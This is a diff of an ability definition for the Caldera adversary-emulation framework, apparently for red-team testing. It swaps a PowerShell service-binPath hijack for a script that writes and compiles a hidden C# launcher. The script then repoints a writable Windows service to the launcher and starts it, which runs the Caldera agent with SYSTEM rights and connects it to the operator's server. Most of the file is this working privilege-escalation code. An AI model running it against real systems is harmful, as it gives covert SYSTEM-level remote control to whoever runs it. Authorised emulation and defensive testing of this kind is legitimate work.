@@ -1,6 +1,6 @@
-- id: c9a0e6b8-9e5c-4b6a-9a9c-29e87f8d6e3e
-  name: Privilege Escalation - Modify Service for Fileless Payload
-  description: Exploits a writable service by reconfiguring its binary path to launch the Caldera agent via a hidden PowerShell window. Creates a fact upon successful modification.
+- id: f0c1d2e3-a4b5-4c6d-8e7f-9a0b1c2d3e4f
+  name: Privilege Escalation - Service Hijack via Custom C# Launcher
+  description: Compiles and hijacks a vulnerable service to launch a Caldera agent with SYSTEM privileges.
   tactic: privilege-escalation
   technique:
     attack_id: T1574.011
@@ -8,20 +8,78 @@
   requirements:
     - plugins.stockpile.app.requirements.existential:
       - source: service.name.writable
+      - source: server.http.address
+      - source: file.path.agent_exe
   platforms:
     windows:
       psh:
         command: |
-          $escalatedGroup = "red_system";
-          $agentCmd = "'C:\Users\Public\splunkd.exe -server #{server} -group $($escalatedGroup)'";
-          $binPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c $($agentCmd)";
-          sc.exe config #{service.name.writable} binPath= "$($binPath)";
+          $payloadDirectory = "C:\Users\Public"
+          $csFilePath = "$payloadDirectory\svc-launcher.cs"
+          $exeFilePath = "$payloadDirectory\svc-launcher.exe"
+
+          $agentPath = '#{file.path.agent_exe}' -replace '\\', '\\\\'
+          $serverAddr = '#{server.http.address}'
+
+          $code = @"
+          using System;
+          using System.Diagnostics;
+          using System.Threading;
+
+          namespace SvcLauncher
+          {
+              class Program
+              {
+                  static void Main(string[] args)
+                  {
+                      try
+                      {
+                          string payloadPath = ""$agentPath"";
+                          string payloadArgs = ""-server $serverAddr -group system-pwned"";
+
+                          ProcessStartInfo psi = new ProcessStartInfo
+                          {
+                              FileName = payloadPath,
+                              Arguments = payloadArgs,
+                              UseShellExecute = false,
+                              CreateNoWindow = true,
+                              WindowStyle = ProcessWindowStyle.Hidden
+                          };
+                          Process.Start(psi);
+                      }
+                      catch {}
+                      Thread.Sleep(30000);
+                  }
+              }
+          }
+          "@
+
+          Set-Content -Path $csFilePath -Value $code -Force
+
+          $compilerPaths = @(
+            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
+            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+          )
+          $compilerPath = $compilerPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
+
+          if (-not $compilerPath) {
+              Write-Error "No C# compiler found!"
+              exit
+          }
+
+          & $compilerPath /nologo /out:$exeFilePath $csFilePath
+
+          if (Test-Path $exeFilePath) {
+              sc.exe config "#{service.name.writable}" binPath= "\"$exeFilePath\""
+              Start-Sleep -Seconds 2
+              sc.exe start "#{service.name.writable}"
+              Write-Host "SUCCESS: Compiled and launched C# service hijacker for service '#{service.name.writable}'."
+          } else {
+              Write-Error "FAILURE: Compilation failed."
+          }
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
-            # This parser looks for the explicit success message from the sc.exe command.
-            - source: 'service.path.modified'
+            - source: service.hijacked.executable
               custom_parser_vals:
-                regex: '\[SC\] ChangeServiceConfig SUCCESS'
-                # We will create a fact with the service name as the value for precise chaining.
-                fact_source_override: '#{service.name.writable}'
-                edge_label: 'has_modified_binpath'
+                regex: "SUCCESS: Compiled and launched C# service hijacker for service '(.*)'"
+                edge_label: hijacked_service
